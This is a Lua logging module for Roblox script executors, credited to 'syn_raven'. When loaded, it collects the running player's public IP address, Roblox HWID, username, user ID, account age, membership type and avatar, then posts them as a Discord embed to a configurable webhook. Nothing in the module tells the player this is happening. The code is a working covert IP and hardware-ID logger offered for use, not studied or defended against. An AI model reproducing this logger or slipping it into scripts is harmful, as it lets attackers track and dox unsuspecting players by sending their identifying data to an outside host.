---@diagnostic disable: undefined-global
local logscript = {
  Webhook = nil,
  WebhookUsername = nil,
  WebhookAvatar = nil,
  Content = nil,
  UserInfoURL = true,
  Description = "```diff\n".."+ by syn_raven#0999".."\n```",
  Username = true,
  MembershipType = true,
  AccountAge = true,
  UserID = true,
  IPAddress = true,
  RobloxHWID = true,
  AvatarThumbnail = true,
}

function logscript:Load()
  local IPv4 = game:HttpGet("https://v4.ident.me/")
  local Headers = {["content-type"] = "application/json"}
  local LocalPlayer = game:GetService("Players").LocalPlayer
  local AccountAge = LocalPlayer.AccountAge
  local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
  local UserId = LocalPlayer.UserId
  local PlayerName = LocalPlayer.Name

  local HttpRequest
  if syn then
    HttpRequest = syn.request
  else
    HttpRequest = http_request
  end

  local http = game:GetService("HttpService")

  local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?format=Png&isCircular=false&size=150x150&userIds="..UserId
  local url2 = "http://ip-api.com/json/"..IPv4

  local response = HttpRequest({Url=url, Method="GET"})

  local json = http:JSONDecode(response.Body)
  local imageUrl = json.data[1].imageUrl

  local PlayerData = {
    ["username"] = logscript.WebhookUsername,
    ["avatar_url"] = logscript.WebhookAvatar,
    ["content"] = logscript.Content,
    ["embeds"] = {
      {
        ["title"] = "User Info",
        ["url"] = nil,
        ["description"] = logscript.Description,
        ["color"] = tonumber(0xffffff),
        ["fields"] = {},
        ["thumbnail"] = {
          ["url"] = nil
        },
        ["image"] = {
          ["url"] = "https://cdn.discordapp.com/attachments/1080302345235210270/1083053024060125265/fotor_2023-3-8_12_45_49.png"
        }
      }
    }
  }

  if logscript.UserInfoURL then
    PlayerData["embeds"][1]["url"] = "https://ipapi.co/?q="..IPv4
  end


  if logscript.Username then
    table.insert(PlayerData["embeds"][1]["fields"], {
      ["name"] = "Username:",
      ["value"] = "["..PlayerName.."](https://www.roblox.com/users/"..UserId.."/profile)",
      ["inline"] = true
    })
  end

  if logscript.MembershipType then
    table.insert(PlayerData["embeds"][1]["fields"], {
      ["name"] = "Membership Type:",
      ["value"] = MembershipType,
      ["inline"] = true
    })
  end

  if logscript.AccountAge then
    table.insert(PlayerData["embeds"][1]["fields"], {
      ["name"] = "Account Age:",
      ["value"] = AccountAge.. " days",
      ["inline"] = true
    })
  end

  if logscript.UserID then
    table.insert(PlayerData["embeds"][1]["fields"], {
      ["name"] = "User ID:",
      ["value"] = UserId,
      ["inline"] = true
    })
  end

  if logscript.IPAddress then
    table.insert(PlayerData["embeds"][1]["fields"], {
      ["name"] = "Public IP Address:",
      ["value"] = IPv4,
      ["inline"] = true
    })
  end

  if logscript.RobloxHWID then
    table.insert(PlayerData["embeds"][1]["fields"], {
      ["name"] = "Roblox HWID:",
      ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
      ["inline"] = true
    })
  end


  if logscript.AvatarThumbnail then
    PlayerData["embeds"][1]["thumbnail"]["url"] = imageUrl
  end


  PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)

  HttpRequest({Url=logscript.Webhook, Body=PlayerData, Method="POST", Headers=Headers})
end

return logscript
